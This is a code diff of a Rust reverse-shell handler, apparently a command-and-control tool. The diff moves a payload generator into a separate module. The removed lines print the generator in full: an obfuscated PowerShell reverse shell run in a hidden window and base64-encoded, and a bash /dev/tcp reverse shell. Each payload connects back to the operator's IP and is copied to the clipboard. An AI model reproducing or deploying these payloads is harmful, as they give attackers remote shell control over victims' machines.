@@ -1,17 +1,14 @@
-mod shell_functions;
+mod shell;
 mod path_completer;
 
 use std::sync::Arc;
 use path_completer::PathCompleter;
 use server_core::Server;
-use crate::shell_functions::connect_to_shell;
+use crate::shell::{connect_to_shell, generate_payload};
 use std::io::Write;
 use clap::{command, Arg};
 use std::process::Command;
 use rustyline::{Editor, error::ReadlineError, Config};
-
-use base64::{engine::general_purpose, Engine as _};
-use local_ip_address::local_ip;
 
 
 fn banner() -> &'static str {
@@ -83,7 +80,7 @@ async fn main() {
                     if let Some(id) = resolve_id(&server, &input_id) {
                         server.kill(&id);
                     }
-                } 
+                }
                 else if command.starts_with("generate_payload ") {
                     let os: String = command.replacen("generate_payload ", "", 1);
                     println!("{}", generate_payload(ip, port, &os));
@@ -152,56 +149,6 @@ fn help_msg() {
     println!("      \x1b[32;1mexit\x1b[0m - \x1b[37;1mClose Server Handler and kill all Sessions\x1b[0m");
     println!("      \x1b[32;1mhelp\x1b[0m - \x1b[37;1mPrint Help\x1b[0m");
     println!(".__________________________________________________________________________________________________________.\n\n");
-}
-
-fn generate_payload(ip: &str, port: &str, os: &str) -> String {
-
-    let ip_address: std::net::IpAddr;
-
-    if ip == "0.0.0.0" || ip == "127.0.0.1" {
-        ip_address = local_ip().unwrap();
-    }
-    else {
-        ip_address = ip.parse().unwrap();
-    }
-
-    println!("\n\x1b[38;5;11mThe payload has been copied to the clipboard....\x1b[0m\n");
-
-    match os {
-
-        "Windows" | "windows" => {
-
-            let plain_payload: String = format!(
-                r#"Start-Process $PSHOME\powershell.exe -ArgumentList {{$var9876543210=New-Object System.Net.Sockets.TCPClient('{}',{});$var1234567890=$var9876543210.GetStream();[byte[]]$var112233445566=0..65535|%{{0}};while(($var9988776655=$var1234567890.Read($var112233445566,0,$var112233445566.Length))-ne0){{ $var5566778899=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($var112233445566,0,$var9988776655);$var4433221100=(i""e''x $var5566778899 2>&1|Out-String);$var4455667788=$var4433221100+'PS '+ {} + '> ';$var2244668800=([text.encoding]::ASCII).GetBytes($var4455667788);$var1234567890.Write($var2244668800,0,$var2244668800.Length);$var1234567890.Flush();}};$var9876543210.Close()}} -WindowStyle Hidden"#,
-                ip_address, port, "$pwd"
-            );
-            
-            let utf16: Vec<u16> = plain_payload.encode_utf16().collect();
-            let mut utf16_bytes: Vec<u8> = Vec::new();
-
-            for code_point in utf16 {
-                utf16_bytes.push((code_point & 0xFF) as u8);
-                utf16_bytes.push((code_point >> 8) as u8); 
-            }
-
-            let payload = format!("powershell -e {}\n", general_purpose::STANDARD.encode(utf16_bytes));
-            let mut clipboard = clippers::Clipboard::get();
-            clipboard.write_text(&payload).unwrap();
-
-            return payload.clone();
-        },
-
-        "Linux" | "linux" => {
-
-            let payload = format!("0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196", ip_address, port);
-            let mut clipboard = clippers::Clipboard::get();
-            clipboard.write_text(&payload).unwrap();
-
-            return payload.clone();
-        },
-
-        _ => { return "\n[\x1b[32;1mX\x1b[0m] Not supported!\n".to_string() },
-    }
 }
 
 fn resolve_id(server: &Server, input: &str) -> Option<String> {
